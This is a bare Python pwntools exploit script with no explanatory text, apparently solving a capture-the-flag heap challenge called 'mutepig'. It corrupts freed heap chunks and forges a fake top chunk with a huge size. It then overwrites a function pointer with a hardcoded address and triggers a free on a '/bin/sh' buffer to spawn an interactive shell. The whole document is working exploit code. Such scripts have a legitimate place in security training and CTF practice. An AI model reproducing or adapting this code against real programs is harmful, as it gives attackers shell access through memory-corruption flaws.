#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./mutepig"
ENV = {"LD_PRELOAD":"./libc.so.6"}

p = process(elf)

def malloc(size, s):
    p.sendline("1")
    p.sendline(str(size))
    p.send(s)

def free(idx):
    p.sendline("2")
    p.sendline(str(idx))

def edit(idx, s1, s2):
    p.sendline("3")
    p.sendline(str(idx))
    p.send(s1)
    p.send(s2)


malloc(1, "A"*0x7)
malloc(1, "A"*0x7)
malloc(1, "A"*0x7)
malloc(1, "A"*0x7)
malloc(1, "A"*0x7)
free(0)
free(1)
free(2)
free(3)
free(4)
malloc(3, "A"*0x7)
malloc(2, "A"*0x7)
malloc(2, "A"*0x7)
malloc(2, "A"*0x7)
free(7)
edit(7, p64(0x6020c8)[:-1], "A"*0x2f)
free(6)
free(8)

fake_top = p8(0)*0x27+p64(0xffffffffffffffa1)

edit(4, p64(0x60213f)[:-1], fake_top)
malloc(2, "/bin/sh")
malloc(0x3419, "A"*0x7)
malloc(1, p64(0x60201800)[:-1])
edit(2, p64(0x4006e0)[:-1], "A"*0x2f)
free(7)

p.interactive()
